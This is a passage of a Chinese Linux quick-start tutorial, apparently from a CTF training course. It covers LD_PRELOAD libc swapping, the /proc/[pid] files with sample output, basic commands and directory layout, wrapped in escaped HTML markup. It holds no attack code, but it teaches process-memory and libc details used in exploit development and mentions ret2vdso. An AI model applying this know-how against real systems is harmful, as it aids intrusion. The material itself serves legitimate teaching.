class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">一个例子：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ ldd /bin/true<br>  linux-vdso.so.1 =&gt;  (0x00007fff9a9fe000)<br>  libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1c083d9000)<br>  /lib64/ld-linux-x86-64.so.2 (0x0000557bcce6c000)<br>$ LD_PRELOAD=~/libc.so.6 ldd /bin/true<br>  linux-vdso.so.1 =&gt;  (0x00007ffee55e9000)<br>  /home/firmy/libc.so.6 (0x00007f4a28cfc000)<br>  /lib64/ld-linux-x86-64.so.2 (0x000055f33bc50000)<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">注意，这种方法得根据实际情况来用，大概就是使用的发行版要相同（`interpreter` 相同），上面的例子中两个 libc 是这样的：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ file /lib/x86_64-linux-gnu/libc-2.23.so<br>/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped<br>$ file ~/libc.so.6<br>/home/firmy/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">都是 `interpreter /lib64/ld-linux-x86-64.so.2`，所以可以替换。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">而下面的例子是在 Arch Linux 上使用一个 Ubuntu 的 libc，就会出错：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ ldd /bin/true<pre><code>  linux-vdso.so.1 (0x00007ffc969df000)\n  libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f7ddde17000)\n  /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f7dde3d7000)\n</code></pre>\n$ LD_PRELOAD=~/libc.so.6 ldd /bin/true<br>Illegal instruction (core dumped)<br>$ file /usr/lib/libc-2.26.so<br>/usr/lib/libc-2.26.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-linux-x86-64.so.2, BuildID[sha1]=458fd9997a454786f071cfe2beb234542c1e871f, for GNU/Linux 3.2.0, not stripped<br>$ file ~/libc.so.6<br>/home/firmy/libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">一个在 `interpreter /usr/lib/ld-linux-x86-64.so.2`，而另一个在 `interpreter /lib64/ld-linux-x86-64.so.2`。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">## /proc/pid</span><br><span class=\"line\"></span><br><span class=\"line\">proc 文件系统是 Linux 内核提供的，为访问系统内核数据的操作提供接口。在该文件系统下，有一些以数字命名的目录，这些数字是进程的 PID 号，而这些目录是进程目录。</span><br><span class=\"line\"></span><br><span class=\"line\">目录下的所有文件如下，然后会介绍几个比较重要的：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n$ cat - &amp;<br>[1] 2865<br>$ ls /proc/2865/<br>attr             cpuset   limits      ns             root          statm<br>autogroup        cwd      map_files   numa_maps      sched         status<br>auxv             environ  maps        oom_adj        schedstat     syscall<br>cgroup           exe      mem         oom_score      setgroups     task<br>clear_refs       fd       mountinfo   oom_score_adj  smaps         timers<br>cmdline          fdinfo   mounts      pagemap        smaps_rollup  timerslack_ns<br>comm             gid_map  mountstats  personality    stack         uid_map<br>coredump_filter  io       net         projid_map     stat          wchan</li>\n</ul>\n<p>[1]+  Stopped                 cat -</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/maps</span><br><span class=\"line\"></span><br><span class=\"line\">这个文件大概是最常用的，用于显示进程的内存区域映射信息：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ cat /proc/2865/maps<br>5580631c6000-5580631ce000 r-xp 00000000 08:01 4981196                    /usr/bin/cat<br>5580633cd000-5580633ce000 r–p 00007000 08:01 4981196                    /usr/bin/cat<br>5580633ce000-5580633cf000 rw-p 00008000 08:01 4981196                    /usr/bin/cat<br>558063c7d000-558063c9e000 rw-p 00000000 00:00 0                          [heap]<br>7f6301cd7000-7f6302027000 r–p 00000000 08:01 4993768                    /usr/lib/locale/locale-archive<br>7f6302027000-7f63021d5000 r-xp 00000000 08:01 4982395                    /usr/lib/libc-2.26.so<br>7f63021d5000-7f63023d5000 —p 001ae000 08:01 4982395                    /usr/lib/libc-2.26.so<br>7f63023d5000-7f63023d9000 r–p 001ae000 08:01 4982395                    /usr/lib/libc-2.26.so<br>7f63023d9000-7f63023db000 rw-p 001b2000 08:01 4982395                    /usr/lib/libc-2.26.so<br>7f63023db000-7f63023df000 rw-p 00000000 00:00 0<br>7f63023df000-7f6302404000 r-xp 00000000 08:01 4982398                    /usr/lib/ld-2.26.so<br>7f63025c1000-7f63025c3000 rw-p 00000000 00:00 0<br>7f63025e1000-7f6302603000 rw-p 00000000 00:00 0<br>7f6302603000-7f6302604000 r–p 00024000 08:01 4982398                    /usr/lib/ld-2.26.so<br>7f6302604000-7f6302605000 rw-p 00025000 08:01 4982398                    /usr/lib/ld-2.26.so<br>7f6302605000-7f6302606000 rw-p 00000000 00:00 0<br>7fff2ab81000-7fff2aba2000 rw-p 00000000 00:00 0                          [stack]<br>7fff2abef000-7fff2abf2000 r–p 00000000 00:00 0                          [vvar]<br>7fff2abf2000-7fff2abf4000 r-xp 00000000 00:00 0                          [vdso]<br>ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/stack</span><br><span class=\"line\"></span><br><span class=\"line\">这个文件表示当前进程的内核调用栈信息：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ sudo cat /proc/2865/stack<br>[<ffffffffa008d05e>] do_signal_stop+0xae/0x1f0<br>[<ffffffffa008e50c>] get_signal+0x18c/0x5a0<br>[<ffffffffa002ac26>] do_signal+0x36/0x610<br>[<ffffffffa0003019>] exit_to_usermode_loop+0x69/0xa0<br>[<ffffffffa00038eb>] syscall_return_slowpath+0x9b/0xb0<br>[<ffffffffa06926e4>] entry_SYSCALL_64_fastpath+0x7b/0x7d<br>[<ffffffffffffffff>] 0xffffffffffffffff</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/auxv</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了传递给进程的解释器信息，即 auxv(AUXiliary Vector)，每一项都是由一个 unsigned long 长度的 ID 加上一个 unsigned long 长度的值构成：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ xxd -e -g8 /proc/2865/auxv<br>00000000: 0000000000000021 00007fff2abf2000  !…….. .<em>….<br>00000010: 0000000000000010 00000000bfebfbff  …………….<br>00000020: 0000000000000006 0000000000001000  …………….<br>00000030: 0000000000000011 0000000000000064  ……..d…….<br>00000040: 0000000000000003 00005580631c6040  ........@`.c.U..<br>00000050: 0000000000000004 0000000000000038  ……..8…….<br>00000060: 0000000000000005 0000000000000009  …………….<br>00000070: 0000000000000007 00007f63023df000  ……….=.c…<br>00000080: 0000000000000008 0000000000000000  …………….<br>00000090: 0000000000000009 00005580631c8290  ………..c.U..<br>000000a0: 000000000000000b 00000000000003e8  …………….<br>000000b0: 000000000000000c 00000000000003e8  …………….<br>000000c0: 000000000000000d 00000000000003e8  …………….<br>000000d0: 000000000000000e 00000000000003e8  …………….<br>000000e0: 0000000000000017 0000000000000000  …………….<br>000000f0: 0000000000000019 00007fff2ab9ff39  ……..9..</em>….<br>00000100: 000000000000001a 0000000000000000  …………….<br>00000110: 000000000000001f 00007fff2aba1feb  ………..<em>….<br>00000120: 000000000000000f 00007fff2ab9ff49  ……..I..</em>….<br>00000130: 0000000000000000 0000000000000000  …………….</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">每个值具体是做什么的，可以用下面的办法显示出来，对比看一看，更详细的可以查看 `/usr/include/elf.h` 和 `man ld.so`：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ LD_SHOW_AUXV=1 cat -<br>AT_SYSINFO_EHDR: 0x7fff6afb3000<br>AT_HWCAP:        bfebfbff<br>AT_PAGESZ:       4096<br>AT_CLKTCK:       100<br>AT_PHDR:         0x557b68217040<br>AT_PHENT:        56<br>AT_PHNUM:        9<br>AT_BASE:         0x7f41e5689000<br>AT_FLAGS:        0x0<br>AT_ENTRY:        0x557b68219290<br>AT_UID:          1000<br>AT_EUID:         1000<br>AT_GID:          1000<br>AT_EGID:         1000<br>AT_SECURE:       0<br>AT_RANDOM:       0x7fff6aedc0a9<br>AT_HWCAP2:       0x0<br>AT_EXECFN:       /usr/bin/cat<br>AT_PLATFORM:     x86_64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">值得一提的是，`AT_SYSINFO_EHDR` 所对应的值是一个叫做的 VDSO(Virtual Dynamic Shared Object) 的地址。在 ret2vdso 漏洞利用方法中会用到（参考章节6.1.6）。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/environ</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了进程的环境变量：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ strings /proc/2865/environ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/fd</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了进程打开文件的情况：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ ls -al /proc/2865/fd<br>total 0<br>dr-x—— 2 firmy firmy  0 12月 30 11:13 .<br>dr-xr-xr-x 9 firmy firmy  0 12月 30 11:13 ..<br>lrwx—— 1 firmy firmy 64 12月 30 12:31 0 -&gt; /dev/pts/2<br>lrwx—— 1 firmy firmy 64 12月 30 12:31 1 -&gt; /dev/pts/2<br>lrwx—— 1 firmy firmy 64 12月 30 12:31 2 -&gt; /dev/pts/2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/status[¶](http://study.ctfcaict.com/media/course/html/3/863846a6-3305-4770-9bb5-ecaa12171a2e.html#procpidstatus)</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了进程的状态信息：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ cat /proc/2865/status<br>Name:   cat<br>Umask:  0022<br>State:  T (stopped)<br>Tgid:   2865<br>Ngid:   0<br>Pid:    2865<br>PPid:   2059<br>TracerPid:      0<br>Uid:    1000    1000    1000    1000<br>Gid:    1000    1000    1000    1000<br>FDSize: 256<br>Groups: 3 7 10 56 90 91 93 95 96 98 1000<br>NStgid: 2865<br>NSpid:  2865<br>NSpgid: 2865<br>NSsid:  2059<br>VmPeak:     7828 kB<br>VmSize:     7828 kB<br>VmLck:         0 kB<br>VmPin:         0 kB<br>VmHWM:       788 kB<br>VmRSS:       788 kB<br>RssAnon:              64 kB<br>RssFile:             724 kB<br>RssShmem:              0 kB<br>VmData:      312 kB<br>VmStk:       132 kB<br>VmExe:        32 kB<br>VmLib:      1876 kB<br>VmPTE:        40 kB<br>VmPMD:        12 kB<br>VmSwap:        0 kB<br>HugetlbPages:          0 kB<br>Threads:        1<br>SigQ:   2/47723<br>SigPnd: 0000000000000000<br>ShdPnd: 0000000000000000<br>SigBlk: 0000000000000000<br>SigIgn: 0000000000000000<br>SigCgt: 0000000000000000<br>CapInh: 0000000000000000<br>CapPrm: 0000000000000000<br>CapEff: 0000000000000000<br>CapBnd: 0000003fffffffff<br>CapAmb: 0000000000000000<br>NoNewPrivs:     0<br>Seccomp:        0<br>Cpus_allowed:   ff<br>Cpus_allowed_list:      0-7<br>Mems_allowed:   00000001<br>Mems_allowed_list:      0<br>voluntary_ctxt_switches:        1<br>nonvoluntary_ctxt_switches:     0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#### /proc/[pid]/syscall</span><br><span class=\"line\"></span><br><span class=\"line\">该文件包含了进程正在执行的系统调用：</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>$ sudo cat /proc/2865/syscall<br>0 0x0 0x7f63025e2000 0x20000 0x22 0xffffffffffffffff 0x0 0x7fff2ab9f958 0x7f630210ea11</p>\n<p>```</p>\n<p>第一个值是系统调用号，后面跟着是六个参数，最后两个值分别是堆栈指针和指令计数器的值。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Linux快速入门\"><a href=\"#Linux快速入门\" class=\"headerlink\" title=\"Linux快速入门\"></a>Linux快速入门</h1><h2 id=\"常用基础命令\"><a href=\"#常用基础命令\" class=\"headerlink\" title=\"常用基础命令\"></a>常用基础命令</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls                  用来显示目标列表</span><br><span class=\"line\"></span><br><span class=\"line\">cd [path]           用来切换工作目录</span><br><span class=\"line\"></span><br><span class=\"line\">pwd                 以绝对路径的方式显示用户当前工作目录</span><br><span class=\"line\"></span><br><span class=\"line\">man [command]       查看Linux中的指令帮助、配置文件帮助和编程帮助等信息</span><br><span class=\"line\"></span><br><span class=\"line\">apropos [whatever]  在一些特定的包含系统命令的简短描述的数据库文件里查找关键字</span><br><span class=\"line\"></span><br><span class=\"line\">echo [string]       打印一行文本，参数“-e”可激活转义字符</span><br><span class=\"line\"></span><br><span class=\"line\">cat [file]          连接文件并打印到标准输出设备上</span><br><span class=\"line\"></span><br><span class=\"line\">less [file]         允许用户向前或向后浏览文字档案的内容</span><br><span class=\"line\"></span><br><span class=\"line\">mv [file1] [file2]  用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中</span><br><span class=\"line\"></span><br><span class=\"line\">cp [file1] [file2]  用来将一个或多个源文件或者目录复制到指定的目的文件或目录</span><br><span class=\"line\"></span><br><span class=\"line\">rm [file]           可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉</span><br><span class=\"line\"></span><br><span class=\"line\">ps                  用于报告当前系统的进程状态</span><br><span class=\"line\"></span><br><span class=\"line\">top                 实时查看系统的整体运行情况</span><br><span class=\"line\"></span><br><span class=\"line\">kill                杀死一个进程</span><br><span class=\"line\"></span><br><span class=\"line\">ifconfig            查看或设置网络设备</span><br><span class=\"line\"></span><br><span class=\"line\">ping                查看网络上的主机是否工作</span><br><span class=\"line\"></span><br><span class=\"line\">netstat             显示网络连接、路由表和网络接口信息</span><br><span class=\"line\"></span><br><span class=\"line\">nc(netcat)          建立 TCP 和 UDP 连接并监听</span><br><span class=\"line\"></span><br><span class=\"line\">su                  切换当前用户身份到其他用户身份</span><br><span class=\"line\"></span><br><span class=\"line\">touch [file]        创建新的空文件</span><br><span class=\"line\"></span><br><span class=\"line\">mkdir [dir]         创建目录</span><br><span class=\"line\"></span><br><span class=\"line\">chmod               变更文件或目录的权限</span><br><span class=\"line\"></span><br><span class=\"line\">chown               变更某个文件或目录的所有者和所属组</span><br><span class=\"line\"></span><br><span class=\"line\">nano / vim / emacs  字符终端的文本编辑器</span><br><span class=\"line\"></span><br><span class=\"line\">exit                退出 shell</span><br><span class=\"line\">管道命令符 &quot;|&quot;       将一个命令的标准输出作为另一个命令的标准输入</span><br></pre></td></tr></table></figure>\n\n<p>使用变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var=value         给变量var赋值value</span><br><span class=\"line\"></span><br><span class=\"line\">$var, $&#123;var&#125;      取变量的值</span><br><span class=\"line\"></span><br><span class=\"line\">`cmd`, $(cmd)     代换标准输出</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;string&#x27;          非替换字符串</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;string&quot;          可替换字符串        </span><br><span class=\"line\">$ var=&quot;test&quot;;</span><br><span class=\"line\">$ echo $var</span><br><span class=\"line\">test</span><br><span class=\"line\">$ echo &#x27;This is a $var&#x27;;</span><br><span class=\"line\">This is a $var</span><br><span class=\"line\">$ echo &quot;This is a $var&quot;;</span><br><span class=\"line\">This is a test</span><br><span class=\"line\"></span><br><span class=\"line\">$ echo `date`;</span><br><span class=\"line\">2017年 11月 06日 星期一 14:40:07 CST</span><br><span class=\"line\">$ $(bash)</span><br><span class=\"line\"></span><br><span class=\"line\">$ echo $0</span><br><span class=\"line\">/bin/bash</span><br><span class=\"line\">$ $($0)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Bash-快捷键\"><a href=\"#Bash-快捷键\" class=\"headerlink\" title=\"Bash 快捷键\"></a>Bash 快捷键</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Up(Down)          上（下）一条指令</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + c          终止当前进程</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + z          挂起当前进程，使用“fg”可唤醒</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + d          删除光标处的字符</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + l          清屏</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + a          移动到命令行首</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + e          移动到命令行尾</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + b          按单词后移（向左）</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + f          按单词前移（向右）</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + Shift + c  复制</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl + Shift + v  粘贴</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"根目录结构\"><a href=\"#根目录结构\" class=\"headerlink\" title=\"根目录结构\"></a>根目录结构</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ uname -a</span><br><span class=\"line\">Linux manjaro 4.11.5-1-ARCH #1 SMP PREEMPT Wed Jun 14 16:19:27 CEST 2017 x86_64 GNU/Linux</span><br><span class=\"line\">$ ls -al /</span><br><span class=\"line\">drwxr-xr-x  17 root root  4096 Jun 28 20:17 .</span><br><span class=\"line\">drwxr-xr-x  17 root root  4096 Jun 28 20:17 ..</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 bin -&gt; usr/bin</span><br><span class=\"line\">drwxr-xr-x   4 root root  4096 Aug 10 22:50 boot</span><br><span class=\"line\">drwxr-xr-x  20 root root  3140 Aug 11 11:43 dev</span><br><span class=\"line\">drwxr-xr-x 101 root root  4096 Aug 14 13:54 etc</span><br><span class=\"line\">drwxr-xr-x   3 root root  4096 Apr  8 19:59 home</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 lib -&gt; usr/lib</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 lib64 -&gt; usr/lib</span><br><span class=\"line\">drwx------   2 root root 16384 Apr  8 19:55 lost+found</span><br><span class=\"line\">drwxr-xr-x   2 root root  4096 Oct  1  2015 mnt</span><br><span class=\"line\">drwxr-xr-x  15 root root  4096 Jul 15 20:10 opt</span><br><span class=\"line\">dr-xr-xr-x 267 root root     0 Aug  3 09:41 proc</span><br><span class=\"line\">drwxr-x---   9 root root  4096 Jul 22 22:59 root</span><br><span class=\"line\">drwxr-xr-x  26 root root   660 Aug 14 21:08 run</span><br><span class=\"line\">lrwxrwxrwx   1 root root     7 Jun 21 22:44 sbin -&gt; usr/bin</span><br><span class=\"line\">drwxr-xr-x   4 root root  4096 May 28 22:07 srv</span><br><span class=\"line\">dr-xr-xr-x  13 root root     0 Aug  3 09:41 sys</span><br><span class=\"line\">drwxrwxrwt  36 root root  1060 Aug 14 21:27 tmp</span><br><span class=\"line\">drwxr-xr-x  11 root root  4096 Aug 14 13:54 usr</span><br><span class=\"line\">drwxr-xr-x  12 root root  4096 Jun 28 20:17 var</span><br></pre></td></tr></table></figure>\n\n<p>由于不同的发行版会有略微的不同，我们这里使用的是基于 Arch 的发行版 Manjaro，以上就是根目录下的内容，我们介绍几个重要的目录： - <code>/bin</code>、<code>/sbin</code>：链接到 <code>/usr/bin</code>，存放 Linux 一些核心的二进制文件，其包含的命令可在 shell 上运行。 - <code>/boot</code>：操作系统启动时要用到的程序。 - <code>/dev</code>：包含了所有 Linux 系统中使用的外部设备。需要注意的是这里并不是存放外部设备的驱动程序，而是一个访问这些设备的端口。 - <code>/etc</code>：存放系统管理时要用到的各种配置文件和子目录。 - <code>/etc/rc.d</code>：存放 Linux 启动和关闭时要用到的脚本。 - <code>/home</code>：普通用户的主目录。 - <code>/lib</code>、<code>/lib64</code>：链接到 <code>/usr/lib</code>，存放系统及软件需要的动态链接共享库。 - <code>/mnt</code>：这个目录让用户可以临时挂载其他的文件系统。 - <code>/proc</code>：虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。 - <code>/root</code>：系统管理员的主目录。 - <code>/srv</code>：存放一些服务启动之后需要提取的数据。 - <code>/sys</code>：该目录下安装了一个文件系统 sysfs。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建时，对应的文件和目录也在内核对象子系统中被创建。 - <code>/tmp</code>：公用的临时文件存放目录。 - <code>/usr</code>：应用程序和文件几乎都在这个目录下。 - <code>/usr/src</code>：内核源代码的存放目录。 - <code>/var</code>：存放了很多服务的日志信息。</p>\n<h2 id=\"进程管理\"><a href=\"#进程管理\" class=\"headerlink\" title=\"进程管理\"></a>进程管理</h2><ul>\n<li>top</li>\n<li>可以实时动态地查看系统的整体运行情况。</li>\n<li>ps</li>\n<li>用于报告当前系统的进程状态。可以搭配 kill 指令随时中断、删除不必要的程序。</li>\n<li>查看某进程的状态：<code>$ ps -aux | grep [file]</code>，其中返回内容最左边的数字为进程号（PID）。</li>\n<li>kill</li>\n<li>用来删除执行中的程序或工作。</li>\n<li>删除进程某 PID 指定的进程：<code>$ kill [PID]</code></li>\n</ul>\n<h2 id=\"UID-和-GID\"><a href=\"#UID-和-GID\" class=\"headerlink\" title=\"UID 和 GID\"></a>UID 和 GID</h2><p>Linux 是一个支持多用户的操作系统，每个用户都有 User ID(UID) 和 